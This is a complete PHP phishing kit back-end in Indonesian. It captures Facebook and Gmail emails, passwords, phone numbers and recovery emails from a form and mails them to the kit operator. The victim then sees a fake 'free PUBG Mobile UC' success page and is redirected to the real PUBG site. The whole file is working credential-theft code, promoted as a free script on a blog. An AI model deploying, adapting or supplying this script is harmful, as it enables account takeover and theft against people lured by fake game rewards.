<?php
error_reporting(0);


$email    = $_POST['email'];
$pass = $_POST['pass'];
$email1    = $_POST['email1'];
$pass1 = $_POST['pass1'];
$text = $_POST['text'];
$xp = $_POST['xp'];
$pn = $_POST['phone'];
$recover = $_POST['emailr'];

$message   = "

>>>>> SETORAN FACEBOOK <<<<<
                               
Email : ".$email."  

Password :  ".$pass."       

>>>>> SETORAN Gmail <<<<<

Email : ".$email1."  

Password :  ".$pass1."  

Nomor HP :  ".$text."  

Email Pemulihan :  ".$recover."  
  
>>>>> DOSA DITANGGUNG SITU <<<<<


+++++ Kunjungi Blog +++++

Uhuinfo.com < berbagai Script Gratis <

BOB SADINO 
-
Saya Bisnis Cari Rugi
Sehingga jika rugi saya
tetap semangat dan jika untung
maka bertambahlah syukur saya
-
Kalo mau sukses carilah
kegagalan sebanyak banyaknya

+++++ Maaf Ceramah ya :) +++++


";

include 'email.php';
$subject = "Akun ".$email." (".$alamat.")";
$headers = "From: UHUINFO99 STOR AKUN <uhuinfo@dot.com>";
mail($emailku, $subject, $message, $headers);

echo "<script LANGUAGE=\"JavaScript\">
<!--
// -->
</script>";
?>
<?php
$random = rand(1000,5000);
?>
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.2//EN" "http://www.openmobilealliance.org/tech/DTD/xhtml-mobile12.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
    <title>Sukses Silahkan Cek Hadiah Kalian</title>
    <center><h2> Sukses Mendapatkan UC<br>Silahkan Tunggu 3 Menit Untuk Mendapatkan Hadiahnya</h2>
    <a href="https://www.pubgmobile.com/en-US/news.shtml">Beranda</a></p></center>
<meta http-equiv="Refresh" content="15; URL=https://www.pubgmobile.com/en-US/news.shtml"/>
</head><body>
</body>
</html>